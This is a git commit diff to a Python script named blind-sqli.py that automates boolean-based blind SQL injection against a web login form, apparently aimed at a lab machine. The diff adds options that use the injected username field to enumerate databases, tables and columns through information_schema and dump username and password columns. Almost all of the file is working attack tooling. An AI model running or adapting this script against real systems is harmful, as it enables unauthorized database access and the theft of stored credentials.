9c58dc89e1e320dcb584467a87f900156575a856
Kyaw Thiha <kyawthiha89@live.com>
2020-05-20 11:21:12 +0800

    Update blind-sqli.py

--- blind-sqli.py
+++ blind-sqli.py
@@ -7,10 +7,13 @@
 
 import requests
 import sys
+from optparse import OptionParser
 
-base_url = "URL_TO_DO"
-session = requests.Session()
-true = "SERVER_RESPONSE"
+
+#base_url = "http://10.10.10.73/login.php"
+#base_url = parser.u
+#session = requests.Session()
+#true = "Wrong identification"
 
 def send_data(url, data):
     return session.post(format(url), data)
@@ -18,8 +21,8 @@ def send_data(url, data):
 def condition(cond):
 
     payload = "admin' and %s#" % cond
-    res = send_data(base_url,{"username":payload, "password": " " ,"submit":"Login"}) #parameter of the request
-    return true in res
+    res = send_data(base_url,{"username":payload, "password": " "}) #parameter of the request
+    return true in res.text
 
 def sqli(sql):
     result = ""
@@ -28,7 +31,7 @@ def sqli(sql):
         range_low = 0
         range_high = 128
 
-        for i in range(0, 8):
+        for i in range(0, 64):
                 testchar = (range_high+range_low)/2
                 res = condition("ascii(substr((%s), %d, 1))>=%d" % (sql, len(result)+1, testchar))
                 if res:
@@ -43,6 +46,38 @@ def sqli(sql):
 
         print "Result: %s" % result
 
-    return result
+    print result
+    
+parser = OptionParser(usage="usage: %prog [-D/-t/-c/-d] -u http://10.10.10.10/login.php -m 'Unknown USER' ")
+parser.add_option("-D","--database",action="store_true",dest="database", help="List of Databases")
+parser.add_option("-t","--table",action="store_true", dest="table", help="List of Tables")
+parser.add_option("-c","--column",action="store_true", dest="column", help="List of Columns")
+parser.add_option("-d","--dump",action="store_true", dest="dump", help="Dump value of Columns")
+parser.add_option("-u","--url",dest="url",help="URL of the Target")
+parser.add_option("-m","--msg",dest="msg",help="TRUE message")
 
-print sqli(sys.argv[1])
+(options,args) = parser.parse_args()
+
+
+base_url = options.url
+session = requests.Session()
+true = options.msg
+if len(args) != 1:
+        parser.error("Need to specified argument")
+
+if options.database:
+        payload = "select group_concat(schema_name) from information_schema.schemata limit 1"
+        print sqli(payload)
+
+if options.table:                                                                                                                                                                                                                                    payload = "select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1"
+        print sqli(payload)
+
+if options.column:
+        #update tablename here
+        payload = "select group_concat(column_name) from information_schema.tables where table_name='tablename' limit 1"
+        print sqli(payload)
+
+if options.dump:
+        #update user,pass with ur column
+        payload = "select group_concat(user,pass) from login limit 1"
+        print sqli(payload)
